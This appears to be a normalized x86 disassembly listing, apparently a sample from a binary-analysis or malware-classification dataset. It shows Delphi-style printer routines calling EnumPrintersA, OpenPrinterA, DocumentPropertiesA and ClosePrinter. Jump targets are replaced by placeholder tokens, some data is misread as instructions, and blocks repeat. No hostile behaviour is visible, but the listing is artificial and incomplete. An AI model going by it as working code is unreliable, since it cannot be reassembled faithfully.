mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40439c
xor eax eax
push ebp
push sub_42b2c9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f40
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42afc0
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b2d0
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
call sub_42aad4
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42ab04
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42aca4
sub_42b2f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_429610
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_429610
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418198
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_429610
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_418198
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_418198
sub_42b380
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_42aa94
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403174
mov eax [ esi + 0x14 ]
call sub_403174
mov eax [ esi + 0x10 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405758
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42b3d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b40b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b412
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42b43c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b461
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b468
retn
sub_42b478
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ edx + eax * 2 + 0xc00 ] 0x0
and [ eax + 0x40 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
or [ ebp + 0x50 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add ah cl
mov ah 0x42
add [ edx ] cl
jo r-xdata
inc edx
add [ eax ] dh
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4b ] dh
jb r-xdata
add [ eax ] al
or [ eax + edx * 2 + 0x72 ] dl
imul ebp [ esi + 0x74 ] 0x56907265
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
push eax
outsd
jb r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_42b468
retn
inc eax
add al dl
mov ah 0x42
add [ ebx ] al
adc edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x724f7265
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] bl
add [ eax ] al
add [ eax ] cl
push esp
push eax
jb r-xdata
jb r-xdata
cmp [ edx ] 0x20
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh 0x42
outsb
je r-xdata
push 0xe0042b7
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
imul esi [ ebx + ecx + 0x70 ] 0x6e614c6f
jae r-xdata
inc edx
mov esi edx
jmp r-xdata
retn 0x8
outsb
je r-xdata
add [ eax ] dl
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
mov dh 0x42
jb r-xdata
add [ eax + edx + 0x180040 ] ch
popad
jo r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
pop ebp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x8b737265
shl [ eax - 0x4b ] 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4b ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
or [ eax + 0x72 ] dl
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
call sub_4040e4
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
mov eax edi
pop edi
pop esi
pop ebx
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42b71b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040e4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4042f8
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040e4
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4040e4
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_4034c0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b722
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040e4
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4042f8
je r-xdata
sub_42b57c
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42b5cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xb6
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
mov dh 0x42
add [ eax ] dl
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
retn 0x8
outsb
je r-xdata
pop ebp
jb r-xdata
call sub_4040e4
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42b71b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040e4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4042f8
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040e4
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4040e4
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_4034c0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b722
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040e4
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4042f8
je r-xdata
sub_42b648
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040e4
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4040e4
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_4040e4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42b6a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42b71b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040e4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4042f8
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b722
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040e4
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4042f8
je r-xdata
sub_42b72c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42b768
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_42b7e4
mov eax esi
call sub_42c0fc
mov eax esi
call sub_42c138
mov eax [ esi + 0x4 ]
call sub_403174
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_42b980
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42b7e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42b902
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b909
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_42b910
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_424af0
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_42bca4
push eax
mov eax esi
call sub_42bcbc
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_4043ac
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4043ac
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4043ac
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_424af0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0x8 ]
call sub_42b5b0
mov edi r-xdata
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_424af0
sub_42b910
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_42b975
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b97c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0x8 ]
call sub_42b5b0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0x4 ]
call sub_42b5b0
jmp r-xdata
sub_42b980
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42b910
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_42b9b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42bca4
push eax
mov eax ebx
call sub_42bcbc
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_4043ac
mov edx eax
mov eax edi
call sub_4085c4
mov eax [ esi + 0x4 ]
call sub_4043ac
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4085c4
mov eax [ esi + 0xc ]
call sub_4043ac
mov edx eax
mov eax [ ebp + 0xc ]
call sub_4085c4
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42ba20
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_42ba5c
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42bc93
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_42b910
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_42c138
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_42ba20
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_42b7e4
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_42bcbc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b648
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_408c7c
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_4040e4
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc9a
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_403f10
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_42b6a8
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_42ba20
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_42bcbc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42beeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_42bea8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026f4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42be97
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_4039d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bef2
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403f10
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_402714
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42b57c
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b648
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_4040e4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b648
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_408c7c
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42b57c
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42befc
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c0d9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407c14
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42c099
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42b57c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_402714
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_42bcbc
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40ca90
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0x41c ]
call sub_42b5b0
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4043ac
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x8 ]
call sub_4043ac
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_42ba5c
call sub_4039d4
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_4040e4
mov edx [ ebp - 0x420 ]
pop eax
call sub_407e48
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0e0
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_403f10
retn
sub_42c0fc
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
